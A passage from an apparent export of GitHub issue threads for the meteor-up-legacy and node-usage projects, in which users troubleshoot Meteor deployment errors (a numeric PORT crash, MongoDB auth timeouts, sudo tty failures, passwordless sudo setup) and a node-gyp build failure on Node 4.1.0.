    at eval (eval at &lt;anonymous&gt; (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ejs/lib/ejs.js:237:14), &lt;anonymous&gt;:29:363)
    at eval (eval at &lt;anonymous&gt; (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ejs/lib/ejs.js:237:14), &lt;anonymous&gt;:29:435)
    at /usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ejs/lib/ejs.js:250:15
    at /usr/local/lib/node_modules/mup/node_modules/nodemiral/lib/session.js:229:55
    at fs.js:271:14
    at Object.oncomplete (fs.js:107:15)
```

If i correct "PORT": "3000" in mup.json

```
mup deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------

Building Started: /Users/laurent/dev/meteor/yo-battle

Started TaskList: Deploy app 'yo-battle' (linux)
[146.185.134.77] - Uploading bundle
[146.185.134.77] &#10004; Uploading bundle: SUCCESS
[146.185.134.77] - Setting up Environment Variables
[146.185.134.77] &#10004; Setting up Environment Variables: SUCCESS
[146.185.134.77] - Invoking deployment process
```

OSX 10.8.5 deploying to Ubuntu server 3.2.0-23
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Update mup now to: v0.7.4
I've made a fix.
On Sun Jan 11 2015 at 9:30:56 PM Laurent Roger notifications@github.com
wrote:

&gt; I had this message with "PORT": 3000
&gt; 
&gt; mup deploy
&gt; 
&gt; ## Meteor Up: Production Quality Meteor Deployments
&gt; 
&gt; Building Started: /Users/laurent/dev/meteor/yo-battle
&gt; 
&gt; Started TaskList: Deploy app 'yo-battle' (linux)
&gt; [146.185.134.77] - Uploading bundle
&gt; [146.185.134.77] &#10004; Uploading bundle: SUCCESS
&gt; [146.185.134.77] - Setting up Environment Variables
&gt; 
&gt; undefined:24
&gt;   throw err;
&gt;         ^
&gt; TypeError: ejs:8
&gt;     6| #it is possible to override above env-vars from the user-provided values
&gt;     7| &lt;% for(var key in env) { %&gt;
&gt; 
&gt; &gt; &gt; 8|   export &lt;%- key %&gt;=&lt;%- env[key].replace(/./ig, '\$&amp;') %&gt;
&gt; &gt; &gt;     9| &lt;% } %&gt;
&gt; &gt; &gt;     10|
&gt; 
&gt; Object 3000 has no method 'replace'
&gt;     at eval (eval at &lt;anonymous&gt; (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ejs/lib/ejs.js:237:14), &lt;anonymous&gt;:29:363)
&gt;     at eval (eval at &lt;anonymous&gt; (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ejs/lib/ejs.js:237:14), &lt;anonymous&gt;:29:435)
&gt;     at /usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ejs/lib/ejs.js:250:15
&gt;     at /usr/local/lib/node_modules/mup/node_modules/nodemiral/lib/session.js:229:55
&gt;     at fs.js:271:14
&gt;     at Object.oncomplete (fs.js:107:15)
&gt; 
&gt; If i correct "PORT": "3000" in mup.json
&gt; 
&gt; mup deploy
&gt; 
&gt; ## Meteor Up: Production Quality Meteor Deployments
&gt; 
&gt; Building Started: /Users/laurent/dev/meteor/yo-battle
&gt; 
&gt; Started TaskList: Deploy app 'yo-battle' (linux)
&gt; [146.185.134.77] - Uploading bundle
&gt; [146.185.134.77] &#10004; Uploading bundle: SUCCESS
&gt; [146.185.134.77] - Setting up Environment Variables
&gt; [146.185.134.77] &#10004; Setting up Environment Variables: SUCCESS
&gt; [146.185.134.77] - Invoking deployment process
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/220.
</Body>
    </Comment>
  </Issue_263>
  <Issue_264>
    <Repository>meteor-up-legacy</Repository>
    <Title>[Request] Meteor Shell Support</Title>
    <Owner>arunoda</Owner>
    <Body>It would be good to have the possibility to connect to the remote application shell.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>I'm not familiar with the Meteor shell. I hope it's not available in
production. Is it?

On Mon Jan 05 2015 at 11:47:35 AM Elyahou notifications@github.com wrote:

&gt; It would be good to have the possibility to connect to the remote
&gt; application shell.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/215.
</Body>
    </Comment>
    <Comment>
      <Owner>Elyahou</Owner>
      <Body>There is no doc on this feature...

I know it from the release announce: https://www.meteor.com/blog/2014/12/19/meteor-102-meteor-shell
</Body>
    </Comment>
    <Comment>
      <Owner>hanchang</Owner>
      <Body>+1, this would be quite useful
</Body>
    </Comment>
    <Comment>
      <Owner>micahalcorn</Owner>
      <Body>Yes please.
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Meteor shell is a Dev only feature. It's not yet available for deployed
apps.

When it is, we can do it.
On 2015 &#3490;&#3505; 25, &#3465;&#3515;&#3538;&#3503;&#3535; at &#3508;.&#3520;. 11.39 Micah Alcorn notifications@github.com
wrote:

&gt; Yes please.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/215#issuecomment-71383928.
</Body>
    </Comment>
    <Comment>
      <Owner>etyp</Owner>
      <Body>Anything new on this? Would be excellent for helping to debug staging environment.
</Body>
    </Comment>
  </Issue_264>
  <Issue_265>
    <Repository>meteor-up-legacy</Repository>
    <Title>If "app" not set - assume it's the current directory...</Title>
    <Owner>arunoda</Owner>
    <Body>This would make it easier to have several people being able to deploy with a shared configuration
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>We recommend mup configurations inside a separate directory.

I fear we can go with this approach.
On 2014 &#3505;&#3548;&#3520;&#3536; 29, &#3523;&#3545;&#3505; at &#3508;.&#3520;. 1.13 Jakob Dam Jensen notifications@github.com
wrote:

&gt; This would make it easier to have several people being able to deploy with
&gt; a shared configuration
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/183.
</Body>
    </Comment>
    <Comment>
      <Owner>jakobdamjensen</Owner>
      <Body>But it's a common approach? Both Capistrano (Rails) and ShipIt (node.js) does just that. It works great.
You could just make it possible to specify a relative path from the mup.json file. In that way people could just store the application in a subfolder where the mup.json is stored (and others could just store it in the same).

If security is a concern: People could use keys instead of passwords. 

So I guess I'm just wondering why this design choice was made? =) 
</Body>
    </Comment>
  </Issue_265>
  <Issue_266>
    <Repository>meteor-up-legacy</Repository>
    <Title>Android Whitescreening on mup deploy</Title>
    <Owner>arunoda</Owner>
    <Body>For some reason, after mup deploy is finished, my Android app will only show a white screen, but when I reinstall the app, it works perfectly fine. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Can you please debug this your app. Here are the steps:
- clone mup locally
- run mup via /path/to/clone/bin/mup deploy
- then here's the bash file related to building: https://github.com/arunoda/meteor-up/blob/master/lib/build.sh

change it's buildMeteorAppForCordova function as following ways and try to deploy
1. change server with your actual server url
2. remove following lines

``` bash
 setTemporaryPlatforms
 trap setOriginalPlatforms EXIT
```

Let me know, how it goes. 
</Body>
    </Comment>
  </Issue_266>
  <Issue_267>
    <Repository>meteor-up-legacy</Repository>
    <Title>Sending Emails without setting MAIL_URL</Title>
    <Owner>arunoda</Owner>
    <Body>I'm deploying to EC2. When I deploy wordpress, the emails work straight away.

When deploying meteor, the emails don't send because there is no MAIL_URL set. Is it possible to use the innate email capabilities of a server?
</Body>
    <State>open</State>
    <Comment>
      <Owner>chmac</Owner>
      <Body>Servers don't automatically have the ability to send email. They need to have some kind of mail server running. It's possible to configure a mail server and add it to the docker image, but probably doesn't make sense. It's easier to use a service like Mandrill and then configure a `MAIL_URL` in the `mup.json` file.

Sidenote, I had huge headaches with mandrill because my ISP blocks port 587. Solution was to use 2525 instead.
</Body>
    </Comment>
  </Issue_267>
  <Issue_268>
    <Repository>meteor-up-legacy</Repository>
    <Title>How to undeploy / delete / revert changes ??</Title>
    <Owner>arunoda</Owner>
    <Body>Is there any command for undeploying &amp; reverting all changes made by meteor-up ??
</Body>
    <State>open</State>
    <Comment>
      <Owner>iboxgithub</Owner>
      <Body>you can use Upstart command to start/stop your app : initctl [start/stop] yourAppName
After, when you redeploy (I guess after a Git pull eg) it will restart your app
</Body>
    </Comment>
    <Comment>
      <Owner>boustanihani</Owner>
      <Body>I meant is there a simple way to remove/delete all files and settings made by meteor deploy or should this be done manually?
</Body>
    </Comment>
    <Comment>
      <Owner>iboxgithub</Owner>
      <Body>Ho for the files generated I just know the manual method (in /opt)
</Body>
    </Comment>
    <Comment>
      <Owner>boustanihani</Owner>
      <Body>If we have to do it manually this is a partial list of things that needs to be changed:
https://github.com/arunoda/meteor-up#server-setup-details
</Body>
    </Comment>
    <Comment>
      <Owner>meonkeys</Owner>
      <Body>FYI, [here's how to temporarily keep a mup-deployed app from automatically starting on boot](http://upstart.ubuntu.com/cookbook/#override-files).

I know this doesn't directly address the issue, but it might still be useful.
</Body>
    </Comment>
  </Issue_268>
  <Issue_269>
    <Repository>meteor-up-legacy</Repository>
    <Title>Error: TIMEOUTED_WAIT_FOR_MONGO -&gt; wait-for-mongo: auth fails</Title>
    <Owner>arunoda</Owner>
    <Body>Deployment fails to Digital Ocean(DO). 
Meteor 0.9.1.1
MONGO_URL in mup.json points to mongohq.
1) Even it says "auth fails", I still can connect with this user/pass to MongoDB from DO server and from local Mongo Client.
2) Also I noticed that Environment Variable MONGO_URL is not set in DO, however during deployment script reported "&#10004; Setting up Environment Variables: SUCCESS"

Any ideas?
Thank you.

Started TaskList: Deploy app 'testApp' (linux)
[178.62.139.45] - Uploading bundle
[178.62.139.45] &#10004; Uploading bundle: SUCCESS
[178.62.139.45] - Setting up Environment Variables
[178.62.139.45] &#10004; Setting up Environment Variables: SUCCESS
[178.62.139.45] - Invoking deployment process
[178.62.139.45] &#10008; Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
Warning: Permanently added '178.62.139.45' (RSA) to the list of known hosts.
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data

/usr/local/lib/node_modules/wait-for-mongo/bin/wait-for-mongo:14
    throw err;
          ^
Error: TIMEOUTED_WAIT_FOR_MONGO
    at null._onTimeout (/usr/local/lib/node_modules/wait-for-mongo/lib/waitForMongo.js:20:14)
    at Timer.listOnTimeout [as ontimeout] (timers.js:112:15)
-----------------------------------STDOUT-----------------------------------

wait-for-mongo: auth fails
wait-for-mongo: auth fails
wait-for-mongo: auth fails
    .....
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>iboxgithub</Owner>
      <Body>I had the same issue that I solved by checking Mongo access from my terminal (case sensitivity) after that normally, if it works from your server terminal it will work from mup
</Body>
    </Comment>
    <Comment>
      <Owner>Kikobeats</Owner>
      <Body>same problem here with digitalocean too...
</Body>
    </Comment>
    <Comment>
      <Owner>whohags</Owner>
      <Body>How did you fix it exactly?
</Body>
    </Comment>
    <Comment>
      <Owner>iboxgithub</Owner>
      <Body>Actually it was not a "fix" properly speaking, I just connected via meteor command, it took more time than usual (all of this is subjective maybe it was something else), I copy pasted user/pass and it worked...no clue what happened but it happened twice and the first time was the classical mistake in my password..newbie one
</Body>
    </Comment>
    <Comment>
      <Owner>iboxgithub</Owner>
      <Body>if you wanna send me your config files I can compare it to mine (of course take off you passwords) and I will check it with my server
</Body>
    </Comment>
    <Comment>
      <Owner>pmalbu</Owner>
      <Body>I am still having issues... could someone please help?
Here is my config with the important parts (I have node and mongo installed on my DigitalOcean VPS already and can connect to mongodb remotely using RoboMongo):

// Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": false,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": false,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "4.4.2",

 // Configure environment
  "env": {
    "ROOT_URL": "http://localhost",
    "PORT": 3000,
    "MONGO_URL": "mongodb://dbuser:dbpass@127.0.0.1:27017/tastetest"
  },

"deployCheckWaitTime": 150
</Body>
    </Comment>
  </Issue_269>
  <Issue_270>
    <Repository>meteor-up-legacy</Repository>
    <Title>Not running on redhat based systems</Title>
    <Owner>arunoda</Owner>
    <Body>I was trying to upload it on a dedicated server running redhat, and it did not work. I think it only works with debian based systems. If so can you please mention that in the readme file. Thanks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yep. Only tested with ubuntu.

---

Arunoda Susiripala
I curate Meteor Weekly - Check it
out!http://meteorhacks.com/meteor-weekly/?utm_source=email-footer&amp;utm_medium=email&amp;utm_campaign=meteorweekly

On Fri, May 16, 2014 at 7:30 PM, Jehanzeb Malik notifications@github.comwrote:

&gt; I was trying to upload it on a dedicated server running redhat, and it did
&gt; not work. I think it only works with debian based systems. If so can you
&gt; please mention that in the readme file. Thanks.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHubhttps://github.com/arunoda/meteor-up/issues/61
&gt; .
</Body>
    </Comment>
    <Comment>
      <Owner>northcoders-chris</Owner>
      <Body>Is this still the case? Just wondering as my clients server is running redhat
</Body>
    </Comment>
  </Issue_270>
  <Issue_271>
    <Repository>meteor-up-legacy</Repository>
    <Title>Show the app error in logs when reverting app</Title>
    <Owner>arunoda</Owner>
    <Body>The error message takes only the last 1000 characters of stderr so I tailed 900 charts to give room for the"appName Application log" line.

Do we want to show the last X lines of stderr, stdout instead of the last 1000 chars?

If so let me know and I can send another pull request.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>I think having whole stderr in important to decide the reason for the issues.
Having the application log with is also very valuable.

I think this will work. Let me give it a try.
</Body>
    </Comment>
  </Issue_271>
  <Issue_272>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploy fails at curl</Title>
    <Owner>arunoda</Owner>
    <Body>I always get `curl: (7) Failed to connect to localhost port 8080: Connection refused` and
`Latest deployment failed! Reverted back to the previous version.` when running `mup deploy`.
1. This happens on a clean install of Ubuntu 14.04 and 12.04.4.
2. I had to do `sudo apt-get install curl` since `mup setup` did not install it.
3. The App starts fine when running `node main.js` and exporting env vars on the server directly. 
4. I changed `deployedCheckWaitTime` to several minutes and it still happens.
5. I also tried setting `setupMongo` and `setupNode` to `false` and installing recent versions manually.
6. This also happens with example meteor apps.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>you can check the logs with _mup logs_ and see what has happened.

---

Arunoda Susiripala
I curate Meteor Weekly - Check it
out!http://meteorhacks.com/meteor-weekly/?utm_source=email-footer&amp;utm_medium=email&amp;utm_campaign=meteorweekly

On Thu, Apr 24, 2014 at 10:03 PM, corv89 notifications@github.com wrote:

&gt; I always get curl: (7) Failed to connect to localhost port 8080:
&gt; Connection refused and
&gt; Latest deployment failed! Reverted back to the previous version. when
&gt; running mup deploy.
&gt; 1. This happens on a clean install of Ubuntu 14.04 and 12.04.4.
&gt; 2. I had to do sudo apt-get install curlsincemup setup` did not
&gt;    install it.
&gt; 3. The App starts fine when running node main.js and exporting env
&gt;    vars on the server directly.
&gt; 4. I changed deployedCheckWaitTime to several minutes and it still
&gt;    happens.
&gt; 5. I also tried setting setupMongo and setupNode to false and
&gt;    installing recent versions manually.
&gt; 6. This also happens with example meteor apps.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHubhttps://github.com/arunoda/meteor-up/issues/46
&gt; .
</Body>
    </Comment>
    <Comment>
      <Owner>zenmatt</Owner>
      <Body>I'm getting a similar error but thought it was related to the fiber package install. I pasted my mup logs output in #49.
</Body>
    </Comment>
    <Comment>
      <Owner>zenmatt</Owner>
      <Body>Problem solved on my end, localhost was not defined in /etc/hosts.
</Body>
    </Comment>
    <Comment>
      <Owner>seiyria</Owner>
      <Body>I'm having this problem as well, but localhost is in my /etc/hosts:

```
127.0.0.1       localhost
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
</Body>
    </Comment>
    <Comment>
      <Owner>rdewolff</Owner>
      <Body>Having the same error, cf https://github.com/arunoda/meteor-up/issues/244
`curl` is installed, as well localhost IP correctly defined.

Any idea what it might be?
</Body>
    </Comment>
    <Comment>
      <Owner>hustbill</Owner>
      <Body>I replace "localhost" by "127.0.0.1".  It works in my Mac Air.   Hope it helps. 
</Body>
    </Comment>
  </Issue_272>
  <Issue_273>
    <Repository>meteor-up-legacy</Repository>
    <Title>Why bundle in my machine instead of server?</Title>
    <Owner>arunoda</Owner>
    <Body>Is there a good reason for that? Internet bandwidth here in my country is very poor and it take "ages" to upload.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yep. I agree.
There are 2 reasons.
1. This follows meteor deploy
2. I had no time to deal with git configurations on the server :)

---

Arunoda Susiripala
I curate Meteor Weekly - Check it
out!http://meteorhacks.com/meteor-weekly/?utm_source=email-footer&amp;utm_medium=email&amp;utm_campaign=meteorweekly

On Thu, Apr 24, 2014 at 2:42 AM, Gabriel H Pugliese &lt;
notifications@github.com&gt; wrote:

&gt; Is there a good reason for that? Internet bandwidth here in my country is
&gt; very poor and it take "ages" to upload.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHubhttps://github.com/arunoda/meteor-up/issues/43
&gt; .
</Body>
    </Comment>
  </Issue_273>
  <Issue_274>
    <Repository>meteor-up-legacy</Repository>
    <Title>sudo: no tty present and no askpass program specified</Title>
    <Owner>arunoda</Owner>
    <Body>This error message appears when running "mup setup" on my Mac to setup my Ubuntu linux machine for mup deployment.
I'm using ssh based authentication (which works fine when I open a ssh terminal session from my Mac to the Ubuntu server)
After hours of googling and experimenting with no luck so far, I now must bow my head in shame and ask for some kind advice...
</Body>
    <State>open</State>
    <Comment>
      <Owner>corv89</Owner>
      <Body>I can confirm this error message on Ubuntu 14.04 server.

You can use the root account on ubuntu as a workaround.
</Body>
    </Comment>
    <Comment>
      <Owner>rmtmckenzie</Owner>
      <Body>I had the same error, and am using root as a workaround as well.... but I'd prefer not to...
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>You don't need to be root. But create an user and allow him to login with SSH keys and make sudo password less.
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>BTW: Since Meteor needs port 80, that's why we need root like permission. But just after we bind to the port, your app will step down to a lower permission group.

So, if someone breach into your app, he will have some hard time.
</Body>
    </Comment>
    <Comment>
      <Owner>corv89</Owner>
      <Body>@arunoda Thank you, that is good to know.
</Body>
    </Comment>
    <Comment>
      <Owner>LeCoupa</Owner>
      <Body>As @arunoda said, run `sudo visudo` and edit the file to be sure that your user can run sudo with no password:

```
# replace this line
%admin  ALL=(ALL) ALL

# by this line
%admin ALL=(ALL) NOPASSWD:ALL
```

And then:

```
sudo service sudo restart
```
</Body>
    </Comment>
    <Comment>
      <Owner>Batistleman</Owner>
      <Body>@LeCoupa +1 for your solution (it would be a good idea to add this in the readme I guess?)
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>@LeCoupa can you send me a PR with this added to the README.

Add under this: https://github.com/arunoda/meteor-up#setting-up-a-server
</Body>
    </Comment>
    <Comment>
      <Owner>kluzny</Owner>
      <Body>Actually, I run my meteor app behind an apache server on 80, so I specified PORT: 3000 in my env block. I got all the way to when I think it is starting the server and poof, it requires sudo. 

I'd prefer not to give my user sudoers at all, and if the port requirement is &gt; 1024, then I don't think it should try to elevate with sudo. 

I was able to get all the directory perms setup for the scp and file juggles, but this last problem confounds me.

I have found this dude, who lets node bind to any lower port, but I don't like that solution either
https://gist.github.com/gadr/6389682
</Body>
    </Comment>
    <Comment>
      <Owner>AWI-Koleok</Owner>
      <Body>Ok i have been trying to get around this for 6 hours, i am stumped guys. I know this an old one, but its still open and it is making my life sad.

I edited `sudoers` via `sudo visudo` to insert to modify sudo and admin group as noted above, and have read about about 20 forum threads top to bottom. Am i missing something? Well, clearly i am. I have created lots of new users on ubuntu vm to try different solutions in isolation, just don't know what else to do. 

I am about to just skip mup and try to deploy manually with demeteorizer, not the solution i was hoping for :(
</Body>
    </Comment>
    <Comment>
      <Owner>alexdmejias</Owner>
      <Body>+1, which is annoying because I have made it work previsouly
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Did you try mupx and follow migration? 
</Body>
    </Comment>
    <Comment>
      <Owner>bgazzera</Owner>
      <Body>@AWI-Koleok Surely you have moved on, but this worked for me.

The instructions on https://github.com/arunoda/meteor-up
say:

```
sudo visudo

# replace this line
%sudo  ALL=(ALL) ALL

# by this line
%sudo ALL=(ALL) NOPASSWD:ALL  

```

Note that this is different from the solution above.
</Body>
    </Comment>
  </Issue_274>
  <Issue_275>
    <Repository>meteor-up-legacy</Repository>
    <Title>Allow non-root account to setup and deploy</Title>
    <Owner>arunoda</Owner>
    <Body>On my servers I prefer to disallow logging in as root and instead use the almighty `sudo` instead. I wonder if it would be possible to make the login part work with an ordinary account, and use `sudo` to ask for the root password in the terminal when appropriate?

Or maybe it's already working. I tried using my ordinary account first but I got the following error message:

```
sudo: no tty present and no askpass program specified
```

The server is running Debian 7, and I'm deploying from OS X 10.9.2.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>We do support Sudo, but not with passwords. You need to make sudo password
less, like in ec2.

On Wednesday, March 19, 2014, Tobias J notifications@github.com wrote:

&gt; On my servers I prefer to disallow logging in as root and instead use the
&gt; almighty sudo instead. I wonder if it would be possible to make the login
&gt; part work with an ordinary account, and use sudo to ask for the root
&gt; password in the terminal when appropriate?
&gt; 
&gt; Or maybe it's already working. I tried using my ordinary account first but
&gt; I got the following error message:
&gt; 
&gt; sudo: no tty present and no askpass program specified
&gt; 
&gt; The server is running Debian 7, and I'm deploying from OS X 10.9.2.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHubhttps://github.com/arunoda/meteor-up/issues/34
&gt; .

## 

---

Arunoda Susiripala
I curate Meteor Weekly - Check it
out!http://meteorhacks.com/meteor-weekly/?utm_source=email-footer&amp;utm_medium=email&amp;utm_campaign=meteorweekly
</Body>
    </Comment>
    <Comment>
      <Owner>nahue</Owner>
      <Body>i configured my user to have sudo password-less but with no success.. finally gone with root and it worked ok..
</Body>
    </Comment>
    <Comment>
      <Owner>danlg</Owner>
      <Body>is this possible sudo without password prompt ? user would be in sudoer group for deployment then remove at runtime. Any alternative? I am really not comfortable by leaving app root access even with userdown. see https://gist.github.com/dergachev/7916152
</Body>
    </Comment>
  </Issue_275>
  <Issue_276>
    <Repository>node-usage</Repository>
    <Title>Ready for production?</Title>
    <Owner>arunoda</Owner>
    <Body>Hi guys,

Someone using this in production?

For istance, how do you know based on the process usage when it's time to scale up an application?

Thanks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>This can be used in production for sure. We used it a lot.
Now we use https://github.com/soyuka/pidusage
(BTW: This still works)

Both packages just shows the CPU usage allocated by the CPU. It proper environments, it'll reach to 100%, but in cloud environments like Heroku it won't reach to 100%.
</Body>
    </Comment>
  </Issue_276>
  <Issue_277>
    <Repository>node-usage</Repository>
    <Title>Build fails in node 4.1.0 (On travis ci)</Title>
    <Owner>arunoda</Owner>
    <Body>After upgrading to usage 0.7.1 all works and installs locally with node 4.1.0

But when trying to install the same on travis.ci I get the following error:

``` bash
Checksums empty
Now using node v4.1.0
$ node --version
v4.1.0
$ npm --version
2.14.3
$ nvm --version
0.23.3
27.40s$ npm install 
npm WARN package.json swamp@0.1.2 No license field.
npm WARN engine appolo-express@1.3.4: wanted: {"node":"0.10.x","npm":"1.4.x"} (current: {"node":"4.1.0","npm":"2.14.3"})
&gt; usage@0.7.1 install /home/travis/build/uditalias/swamp/node_modules/usage
&gt; node-gyp rebuild
make: Entering directory `/home/travis/build/uditalias/swamp/node_modules/usage/build'
  CXX(target) Release/obj.target/sysinfo/src/binding.o
In file included from /home/travis/.node-gyp/4.1.0/include/node/node.h:42:0,
                 from ../src/binding.h:1,
                 from ../src/binding.cpp:1:
/home/travis/.node-gyp/4.1.0/include/node/v8.h:336:1: error: expected unqualified-id before &#8216;using&#8217;
/home/travis/.node-gyp/4.1.0/include/node/v8.h:469:1: error: expected unqualified-id before &#8216;using&#8217;
/home/travis/.node-gyp/4.1.0/include/node/v8.h:852:1: error: expected unqualified-id before &#8216;using&#8217;
In file included from ../node_modules/nan/nan.h:182:0,
                 from ../src/binding.cpp:2:
../node_modules/nan/nan_maybe_43_inl.h:13:1: error: expected unqualified-id before &#8216;using&#8217;
../node_modules/nan/nan_maybe_43_inl.h:16:1: error: expected unqualified-id before &#8216;using&#8217;
../node_modules/nan/nan_maybe_43_inl.h:19:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:24:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:31:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:36:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:41:1: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:46:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:51:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:60:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:65:12: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:70:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:77:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:84:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:92:12: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:99:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:109:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:115:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:119:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:126:1: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:131:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:136:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:140:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:146:12: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:151:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:157:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:163:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:169:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:175:12: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:181:12: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:187:12: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:195:12: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:202:1: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:206:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:210:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:214:12: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_maybe_43_inl.h:218:12: error: &#8216;MaybeLocal&#8217; does not name a type
In file included from ../node_modules/nan/nan.h:187:0,
                 from ../src/binding.cpp:2:
../node_modules/nan/nan_converters.h:14:11: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_converters.h:16:56: error: &#8216;Maybe&#8217; does not name a type
../node_modules/nan/nan_converters.h:26:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:27:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:28:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:29:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:30:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:31:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:32:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:42:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:43:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:44:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:45:1: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_converters.h:46:1: error: &#8216;return_t&#8217; does not name a type
In file included from ../node_modules/nan/nan_converters.h:59:0,
                 from ../node_modules/nan/nan.h:187,
